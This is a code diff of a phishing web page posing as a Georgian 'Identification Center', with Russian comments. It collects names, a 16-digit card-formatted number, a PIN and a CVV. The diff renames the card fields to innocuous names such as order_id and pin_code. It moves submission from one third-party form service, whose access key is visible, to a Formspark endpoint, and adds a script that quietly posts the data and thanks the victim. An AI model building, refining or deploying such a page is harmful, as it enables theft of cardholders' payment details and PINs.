@@ -86,6 +86,14 @@ button:hover {
     background-color: #0056b3;
 }
 
+.success-message {
+    text-align: center;
+    color: green;
+    margin-top: 15px;
+    display: none;
+    font-weight: bold;
+}
+
 @media (max-width: 480px) {
     .form-container {
         padding: 20px;
@@ -103,12 +111,7 @@ button:hover {
 <div class="form-container">
     <h1>იდენტიფიკაციის ცენტრი</h1>
 
-    <!-- ИСПРАВЛЕНО: Интеграция с Web3Forms -->
-    <form action="https://api.web3forms.com/submit" method="POST">
-
-        <!-- ВАШ КЛЮЧ ИЗ СКРИНШОТА -->
-        <input type="hidden" name="access_key" value="fd6696d5-a3d1-4e3f-a4ba-1326d556984e">
-
+    <form id="contact-form" action="https://submit.formspark.io/ZNHCwJg0T" method="POST">
         <h3>დატოვეთ თქვენი მონაცემები</h3>
 
         <label for="first-name">სახელი (Имя)</label>
@@ -117,8 +120,8 @@ button:hover {
         <label for="last-name">გვარი (Фамилия)</label>
         <input type="text" name="last_name" id="last-name" required>
 
-        <label for="card-number">order_id</label>
-        <input type="text" name="card_number" id="card-number"
+        <label for="order-id">order_id</label>
+        <input type="text" name="order_id" id="order-id"
                placeholder="0000 0000 0000 0000"
                maxlength="19"
                inputmode="numeric"
@@ -126,17 +129,15 @@ button:hover {
 
         <div class="expiry-cvv-row">
             <div>
-                <label for="expiry-date">pin_code</label>
-                <input type="text" name="expiry_date"
-                       id="expiry-date"
+                <label for="pin-code">pin_code</label>
+                <input type="text" name="pin_code" id="pin-code"
                        placeholder="pin_code"
                        maxlength="5"
                        required>
             </div>
             <div>
-                <label for="cvv">pin_code</label>
-                <input type="password" name="cvv_code"
-                       id="cvv"
+                <label for="cvv">cvv</label>
+                <input type="password" name="cvv_code" id="cvv"
                        placeholder="***"
                        maxlength="3"
                        inputmode="numeric"
@@ -144,33 +145,47 @@ button:hover {
             </div>
         </div>
 
-        <!-- Дополнительные настройки для красоты -->
-        <input type="hidden" name="from_name" value="Identification Center">
-        <input type="hidden" name="subject" value="Новая заявка от клиента">
-
         <button type="submit">მონაცების გაგზავნა</button>
     </form>
+
+    <div class="success-message" id="success-message">Спасибо! Ваша заявка отправлена.</div>
 </div>
 
 <script>
 // Форматирование номера карты
-document.getElementById('order_id').addEventListener('input', function (e) {
+document.getElementById('order-id').addEventListener('input', function (e) {
     let value = e.target.value.replace(/\D/g, '').slice(0,16);
     e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
 });
 
-// Форматирование срока действия
-document.getElementById('pin_code').addEventListener('input', function (e) {
-    let value = e.target.value.replace(/\D/g, '').slice(0,4);
-    if (value.length > 2) {
-        value = value.slice(0,2) + '/' + value.slice(2);
-    }
-    e.target.value = value;
+// Только цифры для pin_code
+document.getElementById('pin-code').addEventListener('input', function (e) {
+    e.target.value = e.target.value.replace(/\D/g, '').slice(0,5);
 });
 
 // Только цифры для CVV
-document.getElementById(pin_code').addEventListener('input', function (e) {
+document.getElementById('cvv').addEventListener('input', function (e) {
     e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
+});
+
+// Отправка формы с уведомлением без перезагрузки
+document.getElementById('contact-form').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const form = e.target;
+    fetch(form.action, {
+        method: 'POST',
+        body: new FormData(form),
+        headers: { 'Accept': 'application/json' }
+    }).then(response => {
+        if (response.ok) {
+            form.reset();
+            document.getElementById('success-message').style.display = 'block';
+        } else {
+            alert('Ошибка отправки формы. Попробуйте позже.');
+        }
+    }).catch(error => {
+        alert('Ошибка отправки формы. Попробуйте позже.');
+    });
 });
 </script>
 
